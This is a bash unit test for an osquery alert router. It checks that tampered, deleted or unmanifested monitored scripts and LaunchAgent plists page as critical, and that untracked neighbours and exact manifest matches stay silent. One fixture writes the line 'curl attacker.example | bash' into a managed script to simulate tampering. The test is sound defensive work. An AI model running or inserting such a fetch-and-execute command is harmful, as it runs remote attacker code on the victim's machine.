#!/usr/bin/env bash
#
# The route gate's file_events pipeline arm, wired to pipeline_verdict (B12). A
# pipeline_integrity / managed_bin / launch_agents / launch_daemons file event
# consults the verdict instead of paging unconditionally:
#   pipeline_verdict 0 (page: tamper / cannot confirm / no manifest) -> sev=CRIT
#   pipeline_verdict 1 (silent: untracked neighbor, or an exact manifest match) -> continue
#
# With NO manifest present (missing or unreadable), a tracked change fails safe to a
# PAGE (criterion 6). This test pins both halves: the fail-safe page (no manifest)
# AND that the verdict is genuinely consulted - an untracked neighbor stays silent,
# and a stubbed exact (path, sha256) manifest match suppresses the page.
#
# managed_bin is routed through the SAME arm and judged against its own manifest.
# Its events carry an EMPTY sha256, because ~/.local/bin is deliberately absent
# from file_paths_hashes (osqueryd would otherwise hash hundreds of megabytes of
# third-party binaries on every change), so the fixtures below use an empty digest
# for that category to stay in the input space osquery can actually produce.
#
# Unit test: fixture file_events findings under a temp HOME (so the tracked-path
# prefixes resolve), two gate passes (no manifests, then stubbed manifests).
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
ROUTE="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/route.sh"
PIPELINE_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"
ALLOWLIST_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/allowlist-verdict.sh"

fail() {
  printf 'osquery-route-pipeline: FAIL -- %s\n' "$*" >&2
  exit 1
}

for h in "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER"; do
  [[ -f $h ]] || fail "missing helper: $h"
done

work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
home="$work/home"
spy="$work/digest-spy.ndjson"
mkdir -p "$home/.local/libexec/osquery" "$home/.local/bin" "$home/Library/LaunchAgents"
absent_manifest="$work/no-manifest.sha256"
absent_bin_manifest="$work/no-bin-manifest.sha256"

# A file event: q=file_events_recent, cols.category the watch category, target_path
# the file, sha256 the event hash, action the FSEvents verb.
fe() { # <category> <target_path> <sha256> <verb>
  printf '{"q":"file_events_recent","act":"added","cols":{"category":"%s","target_path":"%s","sha256":"%s","action":"%s"},"ep":""}\n' \
    "$1" "$2" "$3" "$4"
}

# run_gate <manifest> <bin-manifest> <finding...> -> page NDJSON on stdout (digests
# go to the spy).
run_gate() {
  local manifest="$1" bin_manifest="$2"
  shift 2
  printf '%s\n' "$@" |
    HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" \
      OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest" OSQUERY_PIPELINE_REHASH_DELAY=0 \
      OSQUERY_LAUNCHD_ALLOWLIST="$work/no-allowlist.txt" DIGEST_SPY="$spy" bash -c '
        source "$1"
        source "$2"
        source "$3"
        digest_append() { printf "%s\n" "$1" >>"$DIGEST_SPY"; }
        route_findings
      ' _ "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER"
}

# assert_paged / refute_paged <pages> <tag> <message>. The negative form is a plain
# helper rather than `! grep` or `grep && fail`: under `set -e` an inverted or
# short-circuited status is not what ends the script, so those shapes only work by
# position accident and go dead the moment a line is added after them.
assert_paged() {
  grep -qF "$2" <<<"$1" || fail "$3"
}
refute_paged() {
  if grep -qF "$2" <<<"$1"; then fail "$3"; fi
}

# ---- Pass A: NO manifests. A tracked change (a libexec script, our own plist, a
#      ~/.local/bin path whose manifest is unreadable) fails safe to a page; an
#      untracked neighbor (a non-osquery plist, a /Library twin of one of our
#      plists) is silent, proving the verdict is consulted. The pipeline event
#      hashes are real 64-hex digests: osquery never emits a short hash, so a
#      fixture must stay in the producible input space. ----
event_hash="2222222222222222222222222222222222222222222222222222222222222222"
printf 'echo relay\n' >"$home/.local/bin/relayTAG02.sh"
page_a="$(run_gate "$absent_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$home/.local/libexec/osquery/results-alerterTAG01.sh" "$event_hash" UPDATED)" \
  "$(fe managed_bin "$home/.local/bin/relayTAG02.sh" "" UPDATED)" \
  "$(fe launch_agents "$home/Library/LaunchAgents/com.webdavis.osquery-uptimeTAG03.plist" "$event_hash" UPDATED)" \
  "$(fe launch_agents "$home/Library/LaunchAgents/com.apple.somethingTAG04.plist" "$event_hash" UPDATED)" \
  "$(fe launch_agents "/Library/LaunchAgents/com.webdavis.osquery-uptimeTAG07.plist" "$event_hash" UPDATED)")"

assert_paged "$page_a" TAG01 "a ~/.local/libexec/osquery script change must PAGE (fail-safe, no manifest)"
assert_paged "$page_a" TAG02 "a ~/.local/bin change with NO managed-bin manifest must PAGE (fail-safe: a broken known-good list gets louder, it does not un-watch the directory)"
assert_paged "$page_a" TAG03 "our own osquery LaunchAgent change must PAGE (fail-safe)"
refute_paged "$page_a" TAG04 "an untracked neighbor plist must be SILENT (the verdict is consulted, not page-always)"
refute_paged "$page_a" TAG07 "a com.webdavis.osquery-*.plist under /Library must NOT be tracked (the manifest can never cover it; persistence default-deny owns it)"

# ---- Pass B: stubbed manifests with exact (path, sha256, mode, uid) matches. A
#      confirmed known-good event stays silent; a DELETE still pages; a managed bin
#      tool whose bytes diverge from its manifest pages; an unmanaged shim beside
#      it, which no manifest lists, stays silent. ----
# The verdict re-reads the target at judgment time, so every known-good file has to
# actually exist and the manifest has to bind its REAL content hash, mode and owner.
known_target="$home/.local/libexec/osquery/knownTAG05.sh"
printf 'echo known-good\n' >"$known_target"
chmod 755 "$known_target"
known_hash="$(shasum -a 256 "$known_target" | awk '{print $1}')"
manifest="$work/pipeline-known-good.sha256"
printf '%s 0755 %s %s\n' "$known_hash" "$(id -u)" "$known_target" >"$manifest"

# A managed bin tool that matches, a managed bin tool that has been tampered, and
# an unmanaged third-party shim that no manifest lists.
bin_known="$home/.local/bin/update-skillsTAG08.sh"
bin_tampered="$home/.local/bin/homebrew-weeklyTAG10.sh"
bin_shim="$home/.local/bin/miseTAG09"
printf 'echo update-skills\n' >"$bin_known"
printf 'echo weekly\n' >"$bin_tampered"
printf 'unmanaged self-updating binary\n' >"$bin_shim"
chmod 755 "$bin_known" "$bin_tampered"
bin_manifest="$work/managed-bin-known-good.sha256"
{
  printf '%s 0755 %s %s\n' "$(shasum -a 256 "$bin_known" | awk '{print $1}')" "$(id -u)" "$bin_known"
  printf '%s 0755 %s %s\n' "$(shasum -a 256 "$bin_tampered" | awk '{print $1}')" "$(id -u)" "$bin_tampered"
} >"$bin_manifest"
printf 'curl attacker.example | bash\n' >"$bin_tampered" # after the manifest was written

page_b="$(run_gate "$manifest" "$bin_manifest" \
  "$(fe pipeline_integrity "$known_target" "$known_hash" UPDATED)" \
  "$(fe pipeline_integrity "$home/.local/libexec/osquery/results-alerterTAG06.sh" "" DELETED)" \
  "$(fe managed_bin "$bin_known" "" UPDATED)" \
  "$(fe managed_bin "$bin_shim" "" UPDATED)" \
  "$(fe managed_bin "$bin_tampered" "" UPDATED)")"

refute_paged "$page_b" TAG05 "an exact (path, sha256) manifest match must be SILENT (the verdict consults the manifest)"
assert_paged "$page_b" TAG06 "a DELETE of a tracked pipeline file must PAGE even with a manifest present"
refute_paged "$page_b" TAG08 "an unchanged managed bin tool whose tuple is in the managed-bin manifest must be SILENT"
refute_paged "$page_b" TAG09 "an UNMANAGED shim in ~/.local/bin must be SILENT (it self-updates and no manifest can vouch for it)"
assert_paged "$page_b" TAG10 "a TAMPERED managed bin tool must PAGE (this is the unattended-script coverage the arm exists for)"

# The pipeline arm never digests; the spy must be empty.
[[ ! -s $spy ]] || fail "a pipeline file event must never digest; spy got: $(cat "$spy")"

# Every paged line is a CRIT finding.
for out in "$page_a" "$page_b"; do
  [[ -z $out ]] && continue
  [[ "$(jq -s 'all(.[]; .sev == "CRIT")' <<<"$out")" == true ]] ||
    fail "every paged pipeline finding must carry .sev == CRIT"
done

printf 'osquery-route-pipeline: OK (fail-safe PAGE for a libexec file, our own home-dir plist and a bin path with no manifest; a non-osquery plist, a /Library twin and an unmanaged bin shim SILENT; manifest exact match SILENT; a tampered managed bin tool and a delete PAGE; none digest)\n'
